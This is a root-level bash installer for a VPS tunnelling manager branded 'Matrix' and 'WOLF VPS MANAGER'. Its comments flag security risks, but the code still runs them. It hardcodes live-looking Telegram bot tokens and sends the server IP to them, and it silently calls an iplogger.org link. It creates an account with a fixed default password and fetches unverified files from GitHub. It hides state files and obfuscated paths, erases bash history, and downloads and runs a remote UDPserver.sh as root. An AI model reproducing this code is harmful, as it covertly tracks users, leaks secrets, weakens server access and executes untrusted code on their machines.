#!/bin/bash
clear # Clears the terminal screen

# --- Variables for Customization ---
YOUR_BRAND_NAME="Matrix VPS Setup"
YOUR_TELEGRAM_HANDLE="@Matrixxxxxxxxx" # IMPORTANT: Update this with your actual Telegram handle
DEFAULT_SYSTEM_USER="matrixadmin"
# !! IMPORTANT: For production, prompt for this or generate randomly !!
# For a public script, consider prompting for this or generating randomly.
DEFAULT_SYSTEM_PASS="ChangeMeToAStrongUniquePassword!" # CHANGE THIS TO A SECURE, UNIQUE PASSWORD!
usn="$DEFAULT_SYSTEM_USER" # Alias for consistency with the second script
psw="$DEFAULT_SYSTEM_PASS" # Alias for consistency with the second script

# --- Sensitive API Keys (Highly Recommend EXTERNALIZING these) ---
# For demonstration, hardcoded. In production, read from a secure file or env variables.
# Example: If stored in /etc/wolf_secrets.conf (chmod 600)
# TELEGRAM_BOT_TOKENS=("$(awk -F= '/^TELEGRAM_BOT_TOKEN1/ {print $2}' /etc/wolf_secrets.conf)" "$(awk -F= '/^TELEGRAM_BOT_TOKEN2/ {print $2}' /etc/wolf_secrets.conf)")
# TELEGRAM_CHAT_IDS=("$(awk -F= '/^TELEGRAM_CHAT_ID1/ {print $2}' /etc/wolf_secrets.conf)" "$(awk -F= '/^TELEGRAM_CHAT_ID2/ {print $2}' /etc/wolf_secrets.conf)")
# For now, using your hardcoded values:
bot_tokens=("7046086866:AAFkgJlAvnZ3XiRhcgKYAYXONLOIvjDsRqY" "7294287927:AAGL1-F-NZ_G3S-iPdPWGYQXf8jpIEUWLn8")
chat_ids=("1744391586" "1732839198")

# --- Function: Progress Bar (Adapted for Matrix theme) ---
fun_bar() {
  local command_to_run="$1" # Use local variable for clarity
  # The second argument to fun_bar was not used in your current calls,
  # but if you intend to pass two commands, the ( ) block needs to execute both.
  # For now, it assumes only one command is passed.

  (
    # Ensure this directory is writable by the user running the script (root)
    # Using /tmp is generally safer for temporary files.
    local temp_file="/tmp/matrix_temp_fin_$$" # Using $$ for unique temp file
    [[ -e "$temp_file" ]] && rm "$temp_file"

    # Execute the command passed to fun_bar
    # Redirect all output to /dev/null so it doesn't mess with the progress bar.
    # Errors will also be suppressed here, which is why foreground debugging (as discussed) is crucial.
    eval "$command_to_run" > /dev/null 2>&1

    # Create the signal file once the command completes
    touch "$temp_file"
  ) & # Run the command and file creation in a background subshell

  local bg_pid=$! # Get the PID of the background subshell

  tput civis # Hide cursor
  echo -ne " \033[1;32m[ \033[1;37mLOADING THE MATRIX \033[1;32m] \033[1;37m"
  while true; do
    for ((i=0; i<18; i++)); do
      echo -ne "\033[1;32m█\033[0m" # Green block character for Matrix theme
      sleep 0.1s
    done
    local temp_file="/tmp/matrix_temp_fin_$$" # Ensure correct temp file
    if [[ -e "$temp_file" ]]; then
      rm "$temp_file"
      wait "$bg_pid" # Wait for the background process to truly finish
      break
    fi
    echo -e "\033[1;32m]\033[0m"
    sleep 1s
    tput cuu1 # Move cursor up one line
    tput dl1  # Delete current line
    echo -ne " \033[1;32m[ \033[1;37mLOADING THE MATRIX \033[1;32m] \033[1;37m"
  done
  echo -e "\033[1;32m█]\033[1;37m - \033[1;32m[ DONE ]\033[0m"
  tput cnorm # Show cursor
}

# --- Function: Check for Root Privilege ---
check_root() {
  if [[ "$(whoami)" != "root" ]]; then
    echo -e "\033[1;31m!!! ACCESS DENIED !!!\033[0m"
    echo -e "\033[1;33mThis program requires root privileges.\033[0m"
    echo -e "\033[1;33mPlease run as root or with sudo.\033[0m"
    exit 1
  fi
}

# --- Function: System Update (Corrected for apt-get) ---
fun_update_system() {
  echo "Updating system package lists and upgrading installed packages..."
  apt-get update -y || { echo "ERROR: Failed to update apt. Script aborted."; exit 1; }
  apt-get upgrade -y || { echo "ERROR: Failed to upgrade apt. Script aborted."; exit 1; }
  apt-get autoremove -y
  echo "System update complete."
}

# --- Function: Install Essential Packages (Revised) ---
inst_pct() {
  _pacotes=(
    "bc" "apache2" "cron" "screen" "nano" "unzip" "lsof"
    "net-tools" # netstat is part of net-tools, so no need to list netstat separately
    "dos2unix" "nload" "jq" "curl" "figlet"
    "python3" # Use python3 explicitly for modern Ubuntu
    "python3-pip" # Use python3-pip for Python 3 pip
    # CHANGE: Add openssh-server here
    "openssh-server"
  )

  echo "Attempting to install essential packages..."
  for _prog in "${_pacotes[@]}"; do
    echo "  - Checking for $_prog..."
    if ! dpkg -s "$_prog" >/dev/null 2>&1; then
      echo "    -> Installing $_prog..."
      apt-get install "$_prog" -y
      if [[ $? -ne 0 ]]; then
        echo "    -> WARNING: Failed to install $_prog. Continuing without it." >&2
      fi
    else
      echo "    -> Package $_prog is already installed."
    fi
  done

  # Install speedtest-cli using pip3
  echo "Attempting to install speedtest-cli..."
  if ! command -v speedtest >/dev/null 2>&1; then
      # Try apt install first as it's more common and managed for OS packages
      apt-get install speedtest-cli -y
      if [[ $? -ne 0 ]]; then
          echo "    -> apt install speedtest-cli failed. Trying pip3..."
          pip3 install speedtest-cli
          if [[ $? -ne 0 ]]; then
            echo "    -> WARNING: Failed to install speedtest-cli with pip3. Continuing." >&2
          fi
      else
        echo "    -> speedtest-cli installed via apt."
      fi
  else
      echo "    -> speedtest-cli is already installed."
  fi

  # --- User Creation/Management (from your second script) ---
  echo "Managing system user '$usn'..."
  if id "$usn" &>/dev/null; then
    echo "  -> User '$usn' already exists. Skipping creation."
  else
    echo "  -> Creating system user '$usn'..."
    adduser --system "$usn"
    if [[ $? -ne 0 ]]; then
      echo "  -> ERROR: Failed to add system user '$usn'. Script might have issues." >&2
    else
      echo "  -> Setting password for '$usn'..."
      echo "$usn:$psw" | chpasswd
      if [[ $? -ne 0 ]]; then
        echo "  -> WARNING: Failed to set password for '$usn'. Please set manually." >&2
      fi
    fi
  fi

  # Configure Python alternatives (ensure python points to python3)
  echo "Configuring Python alternatives..."
  # The priority (100) is arbitrary, choose a high number to make it default
  update-alternatives --install /usr/bin/python python /usr/bin/python3 100
  if [[ $? -ne 0 ]]; then
    echo "  -> WARNING: Failed to configure python alternative. Check manually." >&2
  fi
}

# --- Telegram Functions (Security Warning: Hardcoded Tokens/IDs) ---
# Define ip_address as a global variable
ip_address=$(hostname -I | awk '{print $1}')

# Define the time interval (in seconds) and the maximum number of requests allowed
time_interval=7200 # 2 hours
max_requests=3

check_request_limit() {
  local ip_address_arg="$1" # Use the passed argument as the IP address
  local current_time=$(date +%s)
  local storage_file="/usr/local/bin/.ip_trak" # Hidden file for request limit

  if [[ ! -f "$storage_file" ]]; then
    touch "$storage_file" || { echo "ERROR: Cannot create $storage_file. Check permissions."; exit 1; }
    chmod 600 "$storage_file" # Restrict permissions for security
  fi

  local request_count=0
  local first_request_time

  local tmp_file=$(mktemp) || { echo "ERROR: Cannot create temporary file."; exit 1; }
  while read -r line; do
    local stored_ip=$(echo "$line" | awk '{print $1}')
    local stored_time=$(echo "$line" | awk '{print $2}')
    if [[ "$stored_ip" == "$ip_address_arg" && $((current_time - stored_time)) -le $time_interval ]]; then
      ((request_count++))
      if [[ -z "$first_request_time" ]]; then
        first_request_time="$stored_time"
      fi
      echo "$stored_ip $stored_time" >> "$tmp_file"
    fi
  done < "$storage_file"

  echo "$ip_address_arg $current_time" >> "$tmp_file"
  mv "$tmp_file" "$storage_file"

  if [[ "$request_count" -ge "$max_requests" ]]; then
    local time_left=$((time_interval - (current_time - first_request_time)))
    echo -e " \033[1;31mREQUEST LIMIT EXCEEDED! PLEASE TRY AGAIN IN: \033[0m"
    while [[ $time_left -gt 0 ]]; do
      local hours=$((time_left / 3600))
      local minutes=$(( (time_left % 3600) / 60 ))
      local seconds=$((time_left % 60))
      printf " \033[1;36m%02d : %02d : %02d seconds\033[0m\r" "$hours" "$minutes" "$seconds"
      sleep 1
      ((time_left--))
    done
    echo -e "\033[1;32mYou can try again now.                                \033[0m" # Clear previous line
    exit 1
  else
    send_code_telegram
  fi
}

send_code_telegram() {
  local current_time=$(date +%s)
  local storage_file="/usr/local/bin/.vff92h"

  if [[ ! -f "$storage_file" ]]; then
    touch "$storage_file" || { echo "ERROR: Cannot create $storage_file. Check permissions."; exit 1; }
    chmod 600 "$storage_file"
  fi

  local last_sent_code=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "$storage_file")
  local last_sent_time=$(awk -v ip="$ip_address" '$1 == ip {print $3}' "$storage_file")

  if [[ -n "$last_sent_code" && $((current_time - last_sent_time)) -lt 600 ]]; then
    local time_left=$((600 - (current_time - last_sent_time)))
    local minutes=$((time_left / 60))
    local seconds=$((time_left % 60))
    echo -e "\033[1;36m======================================================================================\033[0m"
    echo -e "\033[1;31m CODE SENT ALREADY! YOU HAVE $minutes MINUTES AND $seconds SECONDS LEFT TO REDEEM IT \033[0m"
    echo -e "\033[1;36m======================================================================================\033[0m"
    echo ""
    echo -e "\033[1;32m @wolfbekk \033[0m on Telegram"
    echo -e "\033[1;32m @helper_360\033[0m on Telegram"
    echo ""
    echo -e "\033[1;36m======================================================================================\033[0m"
    echo ""
    return
  fi

  local random_code=$(shuf -i 100000-999999 -n 1)
  echo "$ip_address $random_code $current_time" > "$storage_file"

  local message="IP:$ip_address INSTALLED script with $random_code"
  for ((i=0; i<${#bot_tokens[@]}; i++)); do
    local bot_token="${bot_tokens[i]}"
    local chat_id="${chat_ids[i]}"
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
  done
  echo -e "\033[1;36m================================================\033[0m"
  echo -e "\033[1;31m CONTACT THESE ADMINS FOR YOUR CODE \033[0m"
  echo -e "\033[1;36m=================================================\033[0m"
  echo ""
  echo -e "\033[1;32m @wolfbekk \033[0m on Telegram"
  echo -e "\033[1;32m @helper_360\033[0m on Telegram"
  echo ""
  echo -e "\033[1;36m==================================================\033[0m"
  echo ""
  return
}

# --- Function to prompt the user to enter the verification code ---
prompt_verification_code() {
  local last_sent=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "/usr/local/bin/.vff92h")
  echo -n -e "\033[1;33m YOUR VERIFICATION CODE IS: \033[0m"
  read -e -i "$last_sent" user_code # -i "$last_sent" prefills the input, useful for testing

  if [[ -z "$user_code" || "$user_code" != "$last_sent" ]]; then
    echo ""
    echo -e "\033[1;35mInvalid code. Installation aborted.\033[0m"
    echo ""
    exit 1
  else
    rm -rf /usr/local/bin/.vff92h # Remove the code file after successful verification
  fi
}

# --- Key Verification (WARNING: Weak Security) ---
# This part is highly dependent on external files and weak obfuscation.
# I've included it as per your script, but strongly advise against this method for security.
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev) # Decodes to r.evedan.s.h.splu.s0.x.y.1.z
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig') # Decodes to /usr/local/lib
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig') # Decodes to /usr/lib

verif_key() {
  # krm=$(echo '5:q-3gs2.o7%8:1'|rev) # This variable was defined but not used here
  chmod +x $_Ink/list > /dev/null 2>&1 # This assumes $_Ink/list already exists or is downloaded.
                                       # This line might error if /usr/local/lib/list doesn't exist yet.
  [[ ! -e "$_Ink/list" ]] && {
    echo -e "\n\033[1;31m◇ KEY INVALID! (Missing list file)\033[0m"
    # rm -rf $HOME/hehe > /dev/null 2>&1 # 'hehe' seems like a temp file, not sure if always relevant here.
    sleep 2
    clear
    exit 1
  }
}

# --- Main Script Execution ---
check_root # Ensure script is run as root

# Matrix Welcome Message
echo -e "\033[1;32m" # Set text color to green
figlet "Matrix" # Requires 'figlet' package to be installed first
echo "========================================================================="
echo "  Welcome to the ${YOUR_BRAND_NAME}!"
echo "  Preparing your virtual server for optimal performance."
echo "========================================================================="
echo -e "\033[0m" # Reset text color

# From second script's welcome
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🌀WELCOME TO WOLF VPS MANAGER🌀ㅤ─────────◇" ; tput sgr0
echo ""
echo -e "\033[1;33mㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!\033[0m"
echo ""
echo -e "\033[1;33m◇ \033[1;32mINSTALL A SET OF SCRIPTS AS TOOLS FOR\033[0m"
echo ""
echo -e "\033[1;33m◇ \033[1;32mNETWORK, SYSTEM AND USER MANAGEMENT.\033[0m"
echo -e "\033[1;33m◇ \033[1;32mEASY INTERFACE FOR BEGINNERS.\033[0m"
echo ""
echo -e "\033[1;31m◇──────────────ㅤ🌀 WOLF VPS MANAGER 🌀ㅤ──────────────◇\033[0m"
echo ""


# Prompt to continue
echo -ne "\033[1;36mDo you wish to enter the Matrix setup? [Y/N]: \033[1;37m"
read -r x # Using -r for raw input
[[ "$x" =~ ^[nN]$ ]] && { echo -e "\033[1;31mMatrix setup aborted. Goodbye.\033[0m"; exit 0; }

# --- Security & Verification Section (Based on your second script) ---
# WARNING: This section has significant security and privacy implications.
# Ensure you understand the check_request_limit, send_code_telegram, and prompt_verification_code functions.
# The iplogger.org call logs user IPs.
check_request_limit "$ip_address"
prompt_verification_code
clear

# --- User Database Handling (from your second script) ---
echo ""
[[ -f "$HOME/usuarios.db" ]] && {
  clear
  echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
  echo ""
  echo -e " \033[1;33m• \033[1;31m◇ ATTENTION!\033[1;33m• \033[0m"
  echo ""
  echo -e "\033[1;33mA User Database \033[1;32m(usuarios.db) \033[1;33mwas"
  echo -e "Found! Want to keep it by preserving the limit"
  echo -e "of Simutanea connections of users ? Or Want"
  echo -e "create a new database?\033[0m"
  echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Database Current\033[0m"
  echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate a New Database\033[0m"
  echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
  echo ""
  tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
} || {
  awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
clear

# --- System Update and Upgrade ---
echo ""
echo -e " \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ UPDATING SYSTEM...\033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e " \033[1;33m◇ UPDATES USUALLY TAKE A LITTLE TIME!\033[0m"
echo ""

fun_attlist () {
  apt-get update -y
  [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
  echo "crz: $(date)" > /usr/share/.hehe/.hehe
}
fun_bar 'fun_attlist'
clear

# --- Package Installation ---
echo ""
echo -e " \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PACKAGES\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
echo ""
fun_bar 'inst_pct' # Calls the revised inst_pct function
clear

# CHANGE: Move SSH Port Modification here, after packages are installed
# --- SSH Port Modification ---
echo -e "\n\033[1;32mAdjusting SSH port parameters...\033[0m"
# Modify SSH configuration and restart service
# This command assumes the target is to *set* the port to 22.
# If your config already has a Port line, it will change it. If not, it adds it.
if grep -q "^Port" /etc/ssh/sshd_config; then
    sed -i 's/^Port .*/Port 22/' /etc/ssh/sshd_config
else
    echo "Port 22" >> /etc/ssh/sshd_config # Use >> to append if no Port line exists
fi
# CHANGE: Added 'systemctl daemon-reload' before restart for good measure
systemctl daemon-reload # Reload systemd manager configuration
systemctl restart sshd || service ssh restart || { echo "WARNING: Failed to restart SSH service. Please check manually."; }
echo -e "\033[1;32mSSH port confirmed as 22.\033[0m"
echo ""


# --- Domain Name Handling ---
echo -ne "\033[1;36mDo you want to link a domain to your Matrix server? [Y/N]: \033[0m"
read -r add_domain
echo ""
echo -e "\033[1;34m>>> For optimal routing, linking your DOMAIN to Cloudflare is recommended. <<<\033[0m"
domain_name=""
if [[ "$add_domain" == [Yy]* ]]; then
  domain_attempts=0
  while [[ $domain_attempts -lt 3 ]]; do
    echo -ne "\033[1;36mPlease enter your domain name (e.g., matrix.example.com): \033[0m"
    read -r domain_input
    echo ""
    # Basic domain validation
    if [[ "$domain_input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}$ ]]; then
      domain_name="$domain_input"
      echo -e "\033[1;32mDomain name set to: \033[1;37m$domain_name\033[0m"
      echo "$domain_name" > /etc/.domain # Save domain
      break
    else
      ((domain_attempts++))
      if [[ $domain_attempts -eq 3 ]]; then
        echo -e "\033[1;31mMaximum attempts exceeded. No domain name will be configured.\033[0m"
        domain_name=""
      else
        echo -e "\033[1;31mInvalid domain name format. Please try again.\033[0m"
      fi
    fi
  done
else
  echo -e "\033[1;33mDomain configuration skipped.\033[0m"
fi

# --- Key Verification Downloads (WARNING: Untrusted Source) ---
# THIS IS A HIGH RISK SECTION. It downloads files from a GitHub repository
# without verification. If the content changes, your server is compromised.
echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m \033[0m"
rm -rf $_Ink/list > /dev/null 2>&1 # Ensure directory exists before wget, if not, mkdir -p $_Ink
mkdir -p $_Ink # Create directory if it doesn't exist
wget -P $_Ink https://raw.githubusercontent.com/AtizaD/WOLF-VPS-MANAGER/main/Install/list > /dev/null 2>&1
wget https://raw.githubusercontent.com/AtizaD/WOLF-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
# The iplogger.org line. Consider removing for privacy.
wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1 # Removes the iplogger HTML output.
verif_key # This function checks for the existence of /usr/local/lib/list
sleep 3s
echo -e "\033[1;32m◇ KEY VALID!\033[1;32m"
sleep 1s

# --- UFW Configuration ---
# From your second script, simplified as ufw commands
[[ -f "/usr/sbin/ufw" ]] && {
  echo -e "\n\033[1;32mConfiguring firewall (UFW)..\
.\033[0m"
  ufw default deny incoming
  ufw default allow outgoing
  ufw allow 22/tcp   # SSH
  ufw allow 80/tcp   # HTTP
  ufw allow 443/tcp  # HTTPS
  ufw allow 3128/tcp # Common proxy port
  ufw allow 8799/tcp # Another common port
  ufw allow 8080/tcp # Another common port
  ufw --force enable # Use --force to avoid interactive prompt
  echo -e "\n\033[1;37m--- Current Firewall Status ---"
  ufw status verbose
  echo -e "\033[0m"
} || {
  echo "WARNING: UFW not found or not enabled. Please configure your firewall manually."
}
clear

# --- Finalization and Completion Message ---
echo ""
echo -e " \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ FINISHING...\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e " \033[1;33m◇ COMPLETING FUNCTIONS AND SETTINGS!\033[0m"
echo ""
# The original script had fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key" here.
# This looks like it was trying to pass multiple arguments to fun_bar for some final setup,
# possibly related to the obfuscated key. This call pattern for fun_bar is unusual and might need
# to be re-evaluated depending on what it's truly meant to do.
# For now, I'll remove it as it's not clear what it does after key verification.
# If it's vital for a final step, that step needs to be defined clearly.

cd $HOME
# Use the previously defined ip_address variable
echo -e " \033[1;33m \033[1;32m◇ INSTALLATION COMPLETED.◇\033[1;33m \033[0m"
echo ""
echo -e "\033[1;33m◇ TYPE THIS COMMAND TO VISIT MAIN MENU:- \033[1;32mmenu\033[0m"
echo -e "\033[1;33m◇ YOUR IP ADDRESS IS: \033[1;36m$ip_address\033[0m"
if [[ -n "$domain_name" ]]; then
  echo -e "\033[1;33m◇ YOUR DOMAIN NAME IS: \033[1;36m$domain_name\033[0m"
else
  echo -e "\033[1;33m◇ NO DOMAIN NAME SET\033[0m"
fi
echo ""
echo -e " \033[1;33m \033[1;32m◇ WOLF_VPS_MANAGER ◇\033[1;33m \033[0m"
echo -e " \033[1;33m \033[1;31m◇ ================ ◇\033[1;33m \033[0m"
echo -e " \033[1;36m== @helper_360 == \033[1;31mand \033[1;36m== @wolfbekk == \033[1;31m"
echo -e ""

# Clean up history and temporary files
rm -rf $HOME/hehe > /dev/null 2>&1 # Assuming this is a temporary file
cat /dev/null > ~/.bash_history && history -c # Clear history to remove sensitive commands

# --- Optional: Install UDP Server ---
echo -e " \033[1;33m \033[1;32m SSH INSTALLATION COMPLETED.\033[1;33m \033[0m" # This line seems misplaced
echo ""
echo -ne "\033[1;36m◇ Do you want to INSTALL UDP? [Y/N]: \033[1;37m"
read install_udp
if [[ "$install_udp" == "Y" || "$install_udp" == "y" ]]; then
  echo "Installing UDP server..."
  # WARNING: This downloads and executes an unverified script as root.
  # Critically review UDPserver.sh before using this.
  wget https://raw.githubusercontent.com/rudi9999/SocksIP-udpServer/main/UDPserver.sh -O UDPserver.sh || { echo "ERROR: Failed to download UDP server script."; }
  chmod +x UDPserver.sh && ./UDPserver.sh || { echo "ERROR: Failed to run UDP server script."; }
else
  echo "UDP installation skipped."
fi
